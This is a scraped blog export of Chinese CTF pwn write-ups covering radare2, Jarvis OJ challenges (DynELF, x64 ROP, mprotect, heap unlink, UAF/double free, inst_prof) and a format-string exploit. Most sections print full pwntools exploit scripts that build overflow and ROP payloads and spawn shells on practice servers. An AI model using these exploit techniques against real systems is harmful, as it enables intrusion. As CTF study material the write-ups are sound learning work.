0x080491a2 43 sym.flag | 0x080490bc push eax ; func main 0x08049060 6 sym.imp.system \\ 0x080490bd call sym.imp.__libc_start_main ; int __libc_star 0x08049000 35 sym._init 0x08049080 6 sub.__gmon_start_80 s 命令可以跳转到某个地址或者已经有了符号的函 数中去。然后我们使用pdf这个命令可以打印main这个函数的汇编代码。 12345678910111213141516171819202122232425262728293031[0x08049090]&gt; s main[0x08049203]&gt; pdf ;-- main:/ (fcn) sym.main 65| sym.main (int argc, char **argv, char **envp);| ; var int local_8h @ ebp-0x8| ; arg int arg_4h @ esp+0x4| ; DATA XREF from entry0 (0x80490b6)| 0x08049203 8d4c2404 lea ecx, [arg_4h] ; 4| 0x08049207 83e4f0 and esp, 0xfffffff0| 0x0804920a ff71fc push dword [ecx - 4]| 0x0804920d 55 push ebp| 0x0804920e 89e5 mov ebp, esp| 0x08049210 53 push ebx| 0x08049211 51 push ecx| 0x08049212 e82d000000 call sym.__x86.get_pc_thunk.ax| 0x08049217 05e92d0000 add eax, 0x2de9| 0x0804921c 83ec0c sub esp, 0xc| 0x0804921f 8d9010e0ffff lea edx, [eax - 0x1ff0]| 0x08049225 52 push edx ; const char *s| 0x08049226 89c3 mov ebx, eax| 0x08049228 e823feffff call sym.imp.puts ; int puts(const char *s)| 0x0804922d 83c410 add esp, 0x10| 0x08049230 e898ffffff call sym.vulnerable| 0x08049235 b800000000 mov eax, 0| 0x0804923a 8d65f8 lea esp, [local_8h]| 0x0804923d 59 pop ecx| 0x0804923e 5b pop ebx| 0x0804923f 5d pop ebp| 0x08049240 8d61fc lea esp, [ecx - 4]\\ 0x08049243 c3 ret radare2还实现了IDA的类似F5功能，我们可以使用pdc命令来实现。(目前看上去真不怎么样 12345678910111213141516171819202122232425262728293031323334[0x08049203]&gt; pdcfunction sym.main () &#123; // 1 basic blocks loc_0x8049203: //DATA XREF from entry0 (0x80490b6) ecx = [arg_4h] //4 esp &amp;= 0xfffffff0 //ebp push dword [ecx - 4] push ebp ebp = esp push ebx push ecx sym.__x86.get_pc_thunk.ax () eax += 0x2de9 //obj._GLOBAL_OFFSET_TABLE esp -= 0xc edx = [eax - 0x1ff0] //&quot;input&quot; str.input push edx //const char *s ; (pstr 0x0804a010) &quot;input&quot; ebx = eax //obj._GLOBAL_OFFSET_TABLE int puts(const char * s : (*0x804a010)0x00177fe0 = input) esp += 0x10 sym.vulnerable () eax = 0 esp = [local_8h] pop ecx pop ebx //ebp esp = [ecx - 4] //ebp return(break)&#125; 还有框架结构界面，我们可以使用大写的VV命令来到框架结构界面。(很赞 .---------------------------------------------------. | [0x8049203] | | ;-- main: | | ;-- eip: | | (fcn) sym.main 65 | | sym.main (int argc, char **argv, char **envp); | | ; var int local_8h @ ebp-0x8 | | ; arg int arg_4h @ esp+0x4 | | ; DATA XREF from entry0 (0x80490b6) | | ; 4 | | lea ecx, [arg_4h] | | and esp, 0xfffffff0 | | push dword [ecx - 4] | | push ebp | | mov ebp, esp | | push ebx | | push ecx | | call sym.__x86.get_pc_thunk.ax;[ga] | | add eax, 0x2de9 | | sub esp, 0xc | | lea edx, [eax - 0x1ff0] | | ; const char *s | | push edx | | mov ebx, eax | | ; int puts(const char *s) | | call sym.imp.puts;[gb] | | add esp, 0x10 | | call sym.vulnerable;[gc] | | mov eax, 0 | | lea esp, [local_8h] | `---------------------------------------------------&apos; 目前就了解了这一点，参考了一些大佬的文章，之后可以尝试着去使用，仅仅局限于IDA,GDB是不行的。就这样。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"tech","slug":"tech","permalink":"http://siriuswhiter.tk/tags/tech/"}]},{"title":"Jarvis OJ-pwn","slug":"jarvis-oj-pwn","date":"2018-09-13T06:17:19.000Z","updated":"2019-03-06T09:18:24.132Z","comments":true,"path":"2018/09/13/jarvis-oj-pwn/","link":"","permalink":"http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/","excerpt":"","text":"开始漫漫刷题之路 level4 - DynELF题目给的东西很少，基本信息如下： 信息main：123456int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); write(1, &quot;Hello, World!\\n&quot;, 0xEu); return 0;&#125; vulnerable_function：123456ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] return read(0, &amp;buf, 0x100u);&#125; 保护：只开启了nx。123456&apos;/root/pwnprac/level4&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 分析read很明显会溢出，溢出到返回地址覆盖为system的地址即可，问题在于其地址的寻找，也就是该题的重点：DynELF。最终思路就是因为可以不断的通过调用write函数来leak函数地址，使用dynelf可以通过泄露的地址确定libc版本来确定system地址。/bin/sh则可以通过调用read来将其写入bss段，调用即可。 exp1234567891011121314151617181920212223242526272829from pwn import *#sh = process(&apos;./level4&apos;)sh = remote(&apos;pwn2.jarvisoj.com&apos;,9880)libc = ELF(&apos;./level4&apos;)bss_add = libc.bss() //直接得到bss段地址def leak(add): //leak函数 pay1 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(add) + p32(4) sh.send(pay1) data = sh.recv(4) return data#神奇DynELF工具使用d = DynELF(leak,elf = ELF(&apos;./level4&apos;)) //初始化DynELF模块 sys_add = d.lookup(&apos;system&apos;,&apos;libc&apos;) //在libc文件中搜索system函数的地址 print hex(sys_add)pay2 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;read&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(0) + p32(bss_add) + p32(8) //调用readsh.send(pay2)sh.send(&apos;/bin/sh\\x00&apos;) pay3 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(sys_add) + &apos;dead&apos; + p32(bss_add)sh.send(pay3)sh.interactive() 获得shell1234[*] Switching to interactive mode$ whoamictf$ 参考:借助DynELF实现无libc的漏洞利用小结 level3_x64 - 64位参数传递当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。 搞了一早上感觉思路完全没毛病，但是poc总是不能用，最终与网上的wp调试比对半天才发现在该文档下的libc-2.19.so文件不是该题的配套libc！！！！！应该是之前某个题的。。。心态爆炸重新下载源文件，问题解决。。。 信息：漏洞函数：明显的栈溢出1234567ssize_t vulnerable_function()&#123; char buf; // [rsp+0h] [rbp-80h] write(1, &quot;Input:\\n&quot;, 7uLL); return read(0, &amp;buf, 0x200uLL);&#125; 思路：整体思路与之前相同：泄露write函数got地址，然后通过调用write函数泄露write真实地址，之后system，/bin/sh什么的手到擒来。所以主要就是练习x64下的参数传递。 exp1234567891011121314151617181920212223242526272829303132from pwn import *#context.log_level = &apos;debug&apos;sh = remote(&apos;pwn2.jarvisoj.com&apos;,9883)#sh = process(&apos;level3&apos;)pwn = ELF(&apos;level3_x64&apos;)libc = ELF(&apos;libc-2.19.so&apos;)pop_rdi_ret = 0x004006b3 #pop rdi ; retpop_rsi_r15_ret = 0x004006b1 #pop rsi ; pop r15 ; retsys_libc_addr = libc.symbols[&apos;system&apos;]binsh_libc_addr = libc.search(&apos;/bin/sh&apos;).next()#----------To get write.got--------------# pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;pay1 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(1) //虽然找不到pop_rdx_ret,但是经调试，rdx值大于8，所以我们可以只接受前八个字符即可。pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])sh.recvuntil(&quot;Input:\\n&quot;)sh.send(pay1)write_addr = u64(sh.recv(8))#---------call system func---------------#sys_addr = write_addr - libc.symbols[&apos;write&apos;] + sys_libc_addrbinsh_addr = write_addr - libc.symbols[&apos;write&apos;] + binsh_libc_addrpay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos; pay2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)sh.send(pay2)sh.interactive() 获得shell： 123$ whoamictf$ level5 - mmap &amp;&amp; mprotect信息同level3_x64 , 假设system 和 execve 被禁用，使用mmap 及mprotect 获取shell 思路先搞清楚mmap 与 mprotect：mmap 就是分配堆内存的那个mmap，原函数为 12#include&lt;sys/mman.h&gt;void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off); mprotect，给addr开始的len长度的内存修改权限，原函数为 1int mprotect(void *addr, size_t len, int prot); 所以可以将shellcode写入bss段之类的调用mprotect函数将其可执行，然后返回地址到shellcode处即可；当然也可以mmap分配一段空间然后一样的操作。 exp稍微有点问题。。但是找不到，莫得办法。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *context.log_level = &apos;debug&apos;#sh = remote(&apos;pwn2.jarvisoj.com&apos;,9884)sh = process(&apos;level3_x64&apos;)pwn = ELF(&apos;level3_x64&apos;)libc = ELF(&apos;libc-2.19.so&apos;)pop_rdi_ret = 0x004006b3 #pop rdi ; retpop_rsi_r15_ret = 0x004006b1 #pop rsi ; pop r15 ; ret#----------To get write.got--------------#sh.recv()pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;pay1 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(0) pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])sh.send(pay1)#gdb.attach(sh)write_addr = u64(sh.recv(8))#gdb.attach(sh)print &quot;write_addr : &quot; + hex(write_addr)#----------to get mprotect.got and write shellcode to bss_addr------#mprotect_got_addr = write_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;mprotect&apos;]print &quot;mprotect_got_addr : &quot;+ hex(mprotect_got_addr)bss_addr = pwn.bss()print &quot;bss_addr : &quot; + hex(bss_addr)pay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;pay2 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(0) pay2 += p64(pwn.symbols[&apos;read&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])sh.send(pay2)shellcode = asm(shellcraft.sh())sh.send(shellcode)sh.recv()#-------------------to write bss &amp;&amp; mprotect to .got table----------------#bss_got_addr = 0x600a80mprotect_got_addr = 0x600a78pay3 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;pay3 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss_got_addr) + p64(0) + p64(pwn.symbols[&apos;read&apos;])pay3 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(mprotect_got_addr) + p64(0) + p64(pwn.symbols[&apos;read&apos;])pay3 += p64(pwn.symbols[&apos;vulnerable_function&apos;])sh.send(pay3)sh.send(p64(bss_got_addr))sh.send(p64(mprotect_got_addr))gdb.attach(sh)#---------------------------init_start = 0x4006a6init_end = 0x400690pay4 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;pay4 += p64(init_start) + &apos;bbbbbbbb&apos;pay4 += p64(0) #rbxpay4 += p64(1) #rbppay4 += p64(mprotect_got_addr) pay4 += p64(7) #r13-&gt;rdxpay4 += p64(0x1000) #r14-&gt;rsipay4 += p64(0x600000) #r15-&gt;rdipay4 += p64(init_end) + &apos;bbbbbbbb&apos; pay4 += p64(0) + p64(1) + p64(bss_got_addr) + p64(0) + p64(0) + p64(0)pay4 += p64(init_end)sh.send(pay4)sh.interactive() level6 - 堆的unlink利用正常的选项类型题 信息main:12345678910111213141516171819202122232425262728293031323334353637int __cdecl main()&#123; unsigned int v0; // eax alarm_func(); main_ptr(); while ( 1 ) &#123; v0 = menu();LABEL_3: switch ( v0 ) &#123; case 1u: list(); continue; case 2u: add(); continue; case 3u: edit(); continue; case 4u: delete(); v0 = menu(); if ( v0 &gt; 5 ) goto LABEL_6; goto LABEL_3; case 5u: puts(&quot;Bye&quot;); return 0; default:LABEL_6: puts(&quot;Invalid!&quot;); break; &#125; &#125;&#125; 问题函数：delete函数未检查inuse位，可以double free，且free完并未清空指针。 12345678910111213141516171819202122int delete()&#123; int v0; // eax int v1; // edx int v3; // eax if ( *(_DWORD *)(dword_804A2EC + 4) &lt;= 0 ) return puts(&quot;No notes yet.&quot;); printf(&quot;Note number: &quot;); v0 = get_num(); if ( v0 &lt; 0 ) return puts(&quot;Invalid number!&quot;); v1 = dword_804A2EC; if ( v0 &gt;= *(_DWORD *)dword_804A2EC ) return puts(&quot;Invalid number!&quot;); --*(_DWORD *)(dword_804A2EC + 4); v3 = v1 + 12 * v0; *(_DWORD *)(v3 + 8) = 0; *(_DWORD *)(v3 + 12) = 0; free(*(void **)(v3 + 16)); return puts(&quot;Done.&quot;);&#125; 同时add与edit会对输入的大小进行（或许）与0x80的对齐，即向上对齐到0x80,0x100,0x180,0x200这样子。不过只需要输入申请大小的内容即可。 保护：（基本上不用看。。） 123456[*] &apos;/root/pwnprac/freenote_x86&apos; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 思路(有点迷) 首先分配5个大小为0x80的内存块（0,1,2,3,4），之后按顺序free掉3号与1号（这样1号内存的fd指针会指向3号），这样0号内存块就可以使用1号内存块的pre_size 与size 位，但我们可以edit 0号内存块大小为0x90，目的是为了在对齐机制的情况下，系统会分配0x100大小的内存块，但因为需要输入申请内存大小的内容，所以只要0x90，即刚好覆盖1号内存块的pre_size与size位，此时可以打印出1号内存块的fd指针，从而泄露出堆的基地址与0号内存的地址。 之后unlink，因为delete漏洞的存在，1号块可以double free,将0号块卸下。这样子就可以对0号块为所欲为。(不太懂怎么为所欲为的) exp（待参透）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from pwn import *#context.log_level = &apos;debug&apos;context.terminal = [&apos;terminator&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]local = 0if local: cn = process(&quot;./freenote_x86&quot;) bin = ELF(&quot;freenote_x86&quot;) libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)else: cn = remote(&apos;pwn2.jarvisoj.com&apos;,9885) bin = ELF(&quot;freenote_x86&quot;) libc = ELF(&quot;libc-2.19.so&quot;)def list_post(): passdef add_post(length,content): cn.sendline(&apos;2&apos;) cn.recvuntil(&apos;Length&apos;) cn.sendline(str(length)) cn.recvuntil(&apos;Enter&apos;) cn.sendline(content)def edit_post(idx,length,content): cn.sendline(&apos;3&apos;) cn.recvuntil(&apos;number&apos;) cn.sendline(str(idx)) cn.recvuntil(&apos;Length&apos;) cn.sendline(str(length)) cn.recvuntil(&apos;Enter&apos;) cn.sendline(content)def del_post(idx): cn.sendline(&apos;4&apos;) cn.recvuntil(&apos;number&apos;) cn.sendline(str(idx))#chunk_list=0x0804A2EC#test=0x08048CC5#-------init-------for i in range(5): add_post(0x80,str(i)*0x80)del_post(3)del_post(1)pay = &apos;0&apos;*0x80 + &apos;a&apos;*0x8edit_post(0,0x88,pay)#------------------#--------leak----------cn.sendline(&apos;1&apos;)cn.recvuntil(&apos;a&apos;*0x8)leak_addr = u32(cn.recv(4))cn.recv()heap_base = leak_addr - 0xdb0#offsetchunk0_addr = heap_base + 0x18success(&quot;leak_addr: &quot;+hex(leak_addr))success(&quot;heap_base: &quot;+hex(heap_base))success(&quot;chunk0_addr: &quot;+hex(chunk0_addr))#----------------------#-------unlink--------pay = p32(0x88) + p32(0x80) + p32(chunk0_addr-0xc) + p32(chunk0_addr-0x8) + &apos;0&apos;*(0x80-4*4)pay += p32(0x80) + p32(0x88+0x88)edit_post(0,len(pay),pay)del_post(1)#----------------------#--------leak----------pay = p32(2) + p32(1) + p32(0x88) + p32(chunk0_addr-0xc)pay += p32(1)+p32(0x4)+p32(bin.got[&apos;strtol&apos;])pay += &apos;\\x00&apos;*(0x88-len(pay))edit_post(0,len(pay),pay)cn.sendline(&apos;1&apos;)cn.recvuntil(&apos;0. &apos;)cn.recvuntil(&apos;1. &apos;)strtol = cn.recvuntil(&apos;\\x0a&apos;)[:-1]cn.recv()strtol = u32(strtol)system = strtol - libc.symbols[&apos;strtol&apos;]+libc.symbols[&apos;system&apos;]success(&quot;strtol: &quot;+hex(strtol))success(&quot;system: &quot;+hex(system))#----------------------#--------hijack&amp;getshell--------edit_post(1,4,p32(system))cn.sendline(&quot;$0&quot;)#----------------------cn.interactive() 获得shell 123Your choice: $ whoamictf$ itemboard2019.2.28一个重要的洞没有注意到，因此做的很麻烦，而且或许是因为one_gadget的条件不够，将其覆盖到malloc hook之后仍然无法getshell，不过也把这个做法记录下来 题目功能 add list show remove 程序会在初始时malloc一块内存来存放之后的指针 add 会malloc(0x18)，分别存放name,description,及单独的free函数的指针，之后再malloc(0x20)，存放name，然后读取用户输入size，malloc(size) list 会显示所有的item的name show 显示用户想要显示的item的name 及description，没有检查inuse remove()按序将特定的item的三个指针依次free，但是没有清空即UAF漏洞，同时可以因此double free，但因为add remove都是三个chunk在，所以会比较麻烦 分析因为指针也在堆地区，同时用户可以自由选择des大小，所以想办法将之前的存放指针的地址给用户，就有了一定的泄露地址能力 也可以想办法将指针指向free后的smallbin，也可以泄露libc double free 可以因此将chunk分配到heap以外，即可以将之伪造到malloc hook之上，覆盖为one_gadget 思路比较简单，但是执行起来复杂度高，且最后没有成功getshell exp 1123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from pwn import *#context.log_level = &apos;debug&apos;sh = process(&apos;./itemboard&apos;)#sh =remote(&apos;pwn2.jarvisoj.com&apos;,&apos;9887&apos;)elf = ELF(&apos;./itemboard&apos;)libc = ELF(&apos;./libc-2.19.so&apos;)def add(name,size,des): sh.sendlineafter(&apos;:\\n&apos;,&apos;1&apos;) sh.sendlineafter(&apos;name?\\n&apos;,name) sh.sendlineafter(&apos;len?\\n&apos;,str(size)) sh.sendlineafter(&apos;Description?\\n&apos;,des)def list(): sh.sendlineafter(&apos;:\\n&apos;,&apos;2&apos;)def show(idx): sh.sendlineafter(&apos;:\\n&apos;,&apos;3&apos;) sh.sendlineafter(&apos;item?\\n&apos;,str(idx))def remove(idx): sh.sendlineafter(&apos;:\\n&apos;,&apos;4&apos;) sh.sendlineafter(&apos;item?\\n&apos;,str(idx))add(&apos;a&apos;,0x20,&apos;b&apos;*0x10)add(&apos;c&apos;,0x20,&apos;d&apos;*0x10)add(&apos;e&apos;,0x10,&apos;f&apos;*9)add(&apos;h&apos;,0x100,&apos;i&apos;*9)add(&apos;A&apos;,0X60,&apos;A&apos;)add(&apos;B&apos;,0X60,&apos;B&apos;)add(&apos;f&apos;,0x100,&apos;g&apos;*0x90)#----------leak heap base---------------------------remove(1)remove(0)add(&apos;g&apos;,0,&apos;&apos;)show(1)sh.recvuntil(&apos;Description:&apos;)leak_addr = u64(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(8,&apos;\\x00&apos;))heap_base = leak_addr-0x560print &apos;heap_base: &apos;+hex(heap_base)#---------leak libc addr----------------------------remove(3)remove(0)add(&apos;g&apos;,9,p64(heap_base+0x690))show(1)sh.recvuntil(&apos;Name:&apos;)leak_addr = u64(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(8,&apos;\\x00&apos;))main_arena = leak_addr - 88libc_addr = main_arena - 0x3c4b20one_gadget = libc_addr + 0xea36d #0x46428 #0xe9415print &apos;main_arena: &apos;+hex(main_arena)print &apos;libc_addr: &apos;+hex(libc_addr)#gdb.attach(sh)#--------double free to getshell-----------------add(&apos;a&apos;,0x20,&apos;a&apos;)add(&apos;v&apos;,0x20,&apos;v&apos;)remove(4)remove(5)remove(4)#gdb.attach(sh)add(&apos;a&apos;*8+p64(0x21),0x60,p64(main_arena-0x33))add(&apos;\\x00&apos;*8,0x60,&apos;\\x00&apos;)add(&apos;zz&apos;,0x60,&apos;kkk&apos;)gdb.attach(sh)add(&apos;AAA&apos;,0x60,&apos;c&apos;*0x13+p64(one_gadget))#gdb.attach(sh)#add(&apos;a&apos;,0x100,&apos;a&apos;)#remove(3)#remove(3)sh.interactive() inst_prof神一般的题，google ctf质量真的不一般。。。 题目开始一个无限循环 1234567891011121314int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; if ( write(1, &quot;initializing prof...&quot;, 0x14uLL) == 20 ) &#123; sleep(5u); alarm(0x1Eu); if ( write(1, &quot;ready\\n&quot;, 6uLL) == 6 ) &#123; while ( 1 ) do_test(); &#125; &#125; exit(0);&#125; 重点do_test 123456789101112131415161718192021222324252627int do_test()&#123; _DWORD *v0; // rbx char v1; // al unsigned __int64 v2; // r12 unsigned __int64 buf; // [rsp+8h] [rbp-18h] v0 = alloc_page(); *(_QWORD *)v0 = *(_QWORD *)&amp;template; v0[2] = *((_DWORD *)&amp;template + 2); v1 = *(&amp;template + 14); *((_WORD *)v0 + 6) = *((_WORD *)&amp;template + 6); *((_BYTE *)v0 + 14) = v1; read_inst((__int64)v0 + 5); // 4 byte make_page_executable(v0); v2 = __rdtsc(); ((void (__fastcall *)(_DWORD *))v0)(v0); // exec buf = __rdtsc() - v2; if ( write(1, &amp;buf, 8uLL) != 8 ) exit(0); return free_page(v0);&#125; 1234567891011 template: ; DATA XREF: do_test+15↑o.rodata:0000000000000C00 mov ecx, 1000h.rodata:0000000000000C05.rodata:0000000000000C05 loc_C05: .rodata:0000000000000C05 nop.rodata:0000000000000C06 nop.rodata:0000000000000C07 nop.rodata:0000000000000C08 nop &lt;-----输入的四个字节在这里.rodata:0000000000000C09 sub ecx, 1.rodata:0000000000000C0C jnz short loc_C05.rodata:0000000000000C0E retn 简单来说就是执行输入的四个字节0x1000次。。。。中间需要防止程序直接exit 分析exp12345678910111213141516171819202122232425262728293031323334353637383940from pwn import * context.arch=&apos;amd64&apos; dec_r14=asm(&apos;dec r14&apos;)+asm(&apos;ret&apos;) inc_r14=asm(&apos;inc r14&apos;)+asm(&apos;ret&apos;) mov_r14_rsp=asm(&apos;mov r14,rsp&apos;)+asm(&apos;ret&apos;) mov_r14_rr14=asm(&apos;mov r14,[r14]&apos;)+asm(&apos;ret&apos;) mov_rrsp_r14=asm(&apos;mov [rsp],r14&apos;) debug=0if debug: p=process(&apos;./inst_prof&apos;) #gdb.attach(proc.pidof(p)[0]) offset=0xD691F-0x202B1 context.log_level=&apos;debug&apos; else: #p = process(&apos;./inst_prof&apos;) p=remote(&apos;pwn2.jarvisoj.com&apos;, 9893) # offset=0xEA36D-0x21F45 offset=0x4647C-0x21F45 def exe(es): p.send(es) p.recvuntil(&apos;\\x00\\x00\\x00&apos;) p.recvuntil(&apos;initializing prof...&apos;) p.recvuntil(&apos;ready&apos;) exe(mov_r14_rsp) for i in range(64): exe(inc_r14) exe(mov_r14_rr14) t1=int(int(offset/0x1000)/2) t2=offset-t1*0x1000*2 add_t1=asm(&apos;add r14,%d&apos;%t1) print(t1) exe(add_t1) exe(add_t1) print(&apos;start inc!&apos;) print(t2) for i in range(t2): exe(inc_r14) p.send(mov_rrsp_r14) p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"pwn-300-Formatting string vulnerability","slug":"pwn-300解析-格式化字符串漏洞利用巩固","date":"2018-09-11T01:51:39.000Z","updated":"2018-09-25T13:44:41.876Z","comments":true,"path":"2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/","link":"","permalink":"http://siriuswhiter.tk/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/","excerpt":"","text":"pwn-300之前有一道pwn-200，也具有canary保护及NX保护，但是直接给了system(‘/bin/sh’)的函数，所以问题的关键就在于如何使程序转向该函数地址执行；幸运的是该程序同时具有格式化字符串漏洞。所以最后的思路就是，第一次输入，格式化字符串漏洞泄露canary，第二次输入溢出到函数返回地址即可。而这道题将输入由gets变为fgets，也就是即使泄露出canary也无法溢出利用（canary必定以/x00结尾），同时没有了现成的system(‘/bin/sh’)函数。 查看内容及保护main函数为：1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [esp+Ch] [ebp-4Ch] unsigned int v5; // [esp+4Ch] [ebp-Ch] v5 = __readgsdword(0x14u); //canary生成 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); fgets(&amp;s, 64, stdin); //fgets,遇/x00停止 printf(&amp;s); //格式化字符串漏洞 fgets(&amp;s, 64, stdin); printf(&amp;s); return 0;&#125; 查看文件保护仍然是canary 与 栈不可执行； 1234567root@xuewenjie-kali:~/tikool# checksec binary_300[*] &apos;/root/tikool/binary_300&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 查看加载函数发现system函数 加载函数 确定思路想到可以使用格式化字符串覆盖某个函数的got表地址，看下程序流程，想到可以覆盖printf函数的got地址，在第二次输入’/bin/sh’，原先的printf(/bin/sh)就会变成system(/bin/sh)，获取shell； 流程实现确定字符串位置123root@xuewenjie-kali:~/tikool# ./binary_300aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x aaaa00000040.f7f285c0.00000000.00000000.00000000.00000000.61616161.78383025.3830252e 即字符串位于第六（相对于）或第七个（相对于） exp如下： 1234567891011121314151617from pwn import *#sh = process(&apos;./binary_300&apos;)sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,22003)libc = ELF(&apos;./binary_300&apos;)printf_got = libc.got[&apos;printf&apos;]system_add = libc.symbols[&apos;system&apos;]payload = fmtstr_payload(7, &#123;printf_got: system_add&#125;) //pwntools自带，用于生成格式化字符串payload；print payloadsh.sendline(payload)sh.recv()sh.sendline(&apos;/bin/sh&apos;)sh.interactive() 成功获得shell12345[*] Switching to interactive mode$ /bin/sh$ whoamictf$","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"format","slug":"format","permalink":"http://siriuswhiter.tk/tags/format/"}]},{"title":"Introduction to pwn 1.3--ret2libc practice","slug":"Introduction to pwn 1.3--ret2libc practice","date":"2018-08-28T04:12:56.000Z","updated":"2019-03-12T14:29:12.306Z","comments":true,"path":"2018/08/28/Introduction to pwn 1.3--ret2libc practice/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/Introduction to pwn 1.3--ret2libc practice/","excerpt":"","text":"关于ret2libc 中的plt/got延迟绑定即当第一次使用某函数时，GOT表中对应表项保存的并不是真实的函数地址，需要通过_dl_runtime_resolve查找到真实的函数地址并填入GOT对应表项，从而在下次再使用该函数时，无需进行查找。我们要泄漏的就是初始化查找后填入GOT对应表项中的函数地址。 使用gdb，断点下在write函数之后，运行，x查看write.plt.got处的值，即实际地址；* plt 与 got文件的plt表中存放着函数的.plt.got 地址，.plt.got 地址处的值为该函数的真正的got地址（也就是我们需要泄露的） 由于延迟绑定机制的存在，我们只能通过泄露被调用的函数的got地址，同时又因为同一libc库中各函数之间的偏移是固定的，我们就能因此来求出其他函数的got地址。 ret2libc的实现 文件给了一个pwnme文件与libc-2.19.so文件；checksec查看文件保护，IDA 查看源码，可以看到buf大小只有0x8，read却允许读入0x100大小的数据，有着明显的栈溢出； 图一](pwn-入门1-3-plt-got/checksec.png) ![图二 查看应用调用函数plt表，objdump -d -M intel -j .plt pwnme可以看到没有调用system，需要我们利用其它已调用的来泄露； 图三 这里决定泄露write函数的got地址：使用pwntools，使程序运行完write函数，得到真实的got地址； 123pwn = ELF(&apos;pwnme&apos;) sh.recvuntil(&apos;flag:&apos;) wri_got = pwn.got[&apos;write&apos;] 构造payload泄露write函数的实际地址 1pay = &apos;a&apos;*20 + p32(pwn.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(wri_got) + p32(4) 泄露libc中的system与/bin/sh地址 123libc = ELF(&apos;libc-2.19.so&apos;)sys_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;system&apos;]binsh_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.search(&apos;/bin/sh&apos;).next() 构造payload 1payload = &apos;a&apos;*20 + p32(sys_addr) + &apos;bbbb&apos; + p32(binsh_addr)","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Introduction to pwn2.3--UAF","slug":"Introduction-to-pwn2-3--UAF","date":"2018-08-28T03:10:56.000Z","updated":"2019-03-20T07:34:55.270Z","comments":true,"path":"2018/08/28/Introduction-to-pwn2-3--UAF/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/Introduction-to-pwn2-3--UAF/","excerpt":"","text":"堆的UAF(use after 